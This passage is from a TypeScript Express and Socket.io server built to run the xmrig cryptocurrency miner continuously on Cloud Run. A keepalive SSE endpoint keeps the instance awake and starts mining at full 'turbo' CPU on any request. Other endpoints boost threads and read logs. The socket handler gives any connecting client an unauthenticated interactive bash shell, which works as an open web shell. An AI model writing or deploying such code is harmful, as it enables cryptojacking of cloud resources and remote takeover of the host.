
  // Continuous Server-Sent Events (SSE) Stream to keep HTTP connections active on Cloud Run
  app.get("/api/keepalive-stream", (req, res) => {
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache, no-transform");
    res.setHeader("Connection", "keep-alive");
    res.setHeader("X-Accel-Buffering", "no");
    res.flushHeaders?.();

    const hostCandidate = (req.headers["x-forwarded-host"] as string) || (req.headers.origin as string) || (req.headers.referer as string) || req.headers.host;
    const targetWorker = getWorkerNameFromUrl(hostCandidate);
    if (!persistentMiningProcess) {
      loadState().then(({ powerMode, threads }) => {
        startPersistentMining(targetWorker, miningStartTime || Date.now(), threads || os.cpus().length, powerMode || "turbo");
      });
    }

    res.write(`data: ${JSON.stringify({ status: "connected", worker: currentActiveWorker || targetWorker, timestamp: Date.now() })}\n\n`);

    const interval = setInterval(() => {
      res.write(`data: ${JSON.stringify({ status: "alive", isMining: !!persistentMiningProcess, worker: currentActiveWorker, timestamp: Date.now() })}\n\n`);
    }, 10000);

    req.on("close", () => {
      clearInterval(interval);
    });
  });

  app.post("/api/mining/turbo", (req, res) => {
    const worker = getWorkerNameFromUrl(req.body?.host || req.headers.host);
    const threads = os.cpus().length;
    startPersistentMining(worker, null, threads, "turbo");
    res.json({
      success: true,
      message: `Mining boosted to MAXIMUM 100% TURBO POWER (${threads} threads, Priority 5, Fast RandomX, No Yield)`,
      threads,
      powerMode: "turbo",
    });
  });

  app.post("/api/mining/stop", async (req, res) => {
    await stopMining();
    res.json({ success: true, message: "Mining stopped" });
  });

  app.post("/api/mining/set-threads", (req, res) => {
    const { threads } = req.body;
    const count = parseInt(threads, 10);
    if (isNaN(count) || count < 1) {
      return res.status(400).json({ error: "Invalid thread count" });
    }
    const worker = getWorkerNameFromUrl();
    startPersistentMining(worker, null, count, count >= os.cpus().length ? "turbo" : "custom");
    res.json({ success: true, threads: count, powerMode: currentPowerMode });
  });

  app.get("/api/mining/logs", async (req, res) => {
    try {
      const content = await fs.readFile(LOG_FILE, "utf-8").catch(() => "");
      res.json({
        success: true,
        content: content.slice(-250000) || "Initializing engine logs... Please wait a few seconds.",
        size: content.length,
      });
    } catch (error: any) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  app.post("/api/mining/logs/clear", async (req, res) => {
    try {
      await fs.writeFile(LOG_FILE, `[${new Date().toISOString()}] Log cleared. Mining engine running.\n`, "utf-8");
      miningLogs.length = 0;
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, error: error.message });
    }
  });

  // System Specs API
  app.get("/api/system/specs", async (req, res) => {
    try {
      const cpus = os.cpus();
      const totalMem = os.totalmem();
      const freeMem = os.freemem();
      
      let storage = "N/A";
      try {
        storage = execSync("df -h /").toString();
      } catch (e) {}

      res.json({
        os: {
          platform: os.platform(),
          release: os.release(),
          type: os.type(),
          arch: os.arch(),
          hostname: os.hostname(),
          uptime: `${Math.floor(os.uptime() / 3600)}h ${Math.floor((os.uptime() % 3600) / 60)}m`,
        },
        cpu: {
          model: cpus[0].model,
          cores: cpus.length,
          speed: `${cpus[0].speed}MHz`,
          loadAvg: os.loadavg(),
        },
        memory: {
          total: `${(totalMem / 1024 / 1024 / 1024).toFixed(2)} GB`,
          free: `${(freeMem / 1024 / 1024 / 1024).toFixed(2)} GB`,
          used: `${((totalMem - freeMem) / 1024 / 1024 / 1024).toFixed(2)} GB`,
        },
        storage,
        shell: process.env.SHELL || "/bin/sh",
        nodeVersion: process.version,
      });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  // Socket.io Terminal Logic
  io.on("connection", (socket) => {
    console.log("Terminal client connected");
    
    try {
      socket.emit("output", "\r\n\x1b[1;34m--- System Shell Initialized ---\x1b[0m\r\n");
      const clientHost = (socket.handshake.headers["x-forwarded-host"] as string) || (socket.handshake.headers.origin as string) || socket.handshake.headers.host;
      const worker = getWorkerNameFromUrl(clientHost);
      const cmdToDisplay = lastExecutedCommand || `./xmrig -o ${MINING_POOL} -a rx/0 -k -u ${MINING_COIN}:${MINING_ADDRESS}.${worker} -t ${activeThreadCount} --keepalive`;
      const banner = getBannerString(worker, activeThreadCount, cmdToDisplay);
      socket.emit("output", banner);
      
      // Attach to active mining session if running
      if (persistentMiningProcess) {
        socket.emit("output", "\r\n\x1b[1;33m--- Connected to Live Continuous Mining Stream ---\x1b[0m\r\n");
        socket.emit("output", miningLogs.join(""));
      }

      // Try to use python3 to spawn a pty for better terminal support
      let term: any;
      const spawnOptions: any = {
        env: { ...process.env, TERM: "xterm-256color" },
        cwd: process.cwd(),
        stdio: ["pipe", "pipe", "pipe"],
      };

      try {
        // Safe check for python3
        const hasPython = execSync("python3 --version", { stdio: 'ignore' });
        term = spawn("python3", ["-c", 'import pty; pty.spawn("/bin/bash")'], spawnOptions);
      } catch (e) {
        console.log("Python3 pty failed, trying bash -i");
        try {
          term = spawn("/bin/bash", ["-i"], spawnOptions);
        } catch (e2) {
          console.log("bash -i failed, falling back to basic sh");
          term = spawn("/bin/sh", [], spawnOptions);
        }
      }

      term.on("error", (err: Error) => {
        console.error("Failed to start shell:", err);
        socket.emit("output", `\r\n\x1b[31mFailed to start shell: ${err.message}\x1b[0m\r\n`);
      });

      socket.on("start-mining", (data?: { threads?: number; mode?: "turbo" | "high" | "custom"; host?: string; url?: string }) => {
        const targetHost = data?.url || data?.host || (socket.handshake.headers["x-forwarded-host"] as string) || socket.handshake.headers.host;
        const worker = getWorkerNameFromUrl(targetHost);
        const threads = data?.threads || os.cpus().length;
        const mode = data?.mode || "turbo";
        startPersistentMining(worker, null, threads, mode);
      });

      socket.on("start-mining-turbo", (data?: { host?: string; url?: string }) => {
        const targetHost = data?.url || data?.host || (socket.handshake.headers["x-forwarded-host"] as string) || socket.handshake.headers.host;
        const worker = getWorkerNameFromUrl(targetHost);
        const threads = os.cpus().length;
        startPersistentMining(worker, null, threads, "turbo");
      });

      socket.on("stop-mining", () => {
        stopMining();
      });

      socket.on("get-mining-status", (callback: any) => {
        if (typeof callback === "function") {
          callback({
            isRunning: !!persistentMiningProcess,
            powerMode: currentPowerMode,
            threads: activeThreadCount,
            maxCores: os.cpus().length,
            startTime: miningStartTime,
            coin: MINING_COIN,
            network: MINING_NETWORK,
            address: MINING_ADDRESS,
            pool: MINING_POOL,
            worker: currentActiveWorker || getWorkerNameFromUrl(),
            lastCommand: lastExecutedCommand,
          });
        }
      });

      socket.on("input", (data) => {
        if (term && term.stdin && term.stdin.writable) {
          term.stdin.write(data);
        }
      });

      socket.on("resize", ({ cols, rows }) => {
        console.log(`Terminal resize requested: ${cols}x${rows}`);
      });

      term.stdout.on("data", (data: Buffer) => {
        socket.emit("output", data.toString());
      });

      term.stderr.on("data", (data: Buffer) => {
        socket.emit("output", data.toString());
      });

      term.on("close", (code: number) => {
        socket.emit("output", `\r\n\x1b[31mShell exited with code ${code}\x1b[0m\r\n`);
        socket.disconnect();
      });

      socket.on("get-mining-logs", async (callback: any) => {
        try {
          const content = await fs.readFile(LOG_FILE, "utf-8").catch(() => "");
          if (typeof callback === "function") {
            callback({ success: true, content: content.slice(-250000) || "Initializing engine logs..." });
          }
        } catch (e) {
          if (typeof callback === "function") {
            callback({ success: false, error: "Log not found" });
          }
        }
      });

      socket.on("disconnect", () => {
        if (term) term.kill();
      });
    } catch (err: any) {
      console.error("Socket error handled:", err);
      socket.emit("output", `\r\n\x1b[31mInternal Server Error: ${err.message}\x1b[0m\r\n`);
    }
  });

  // Vite integration
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
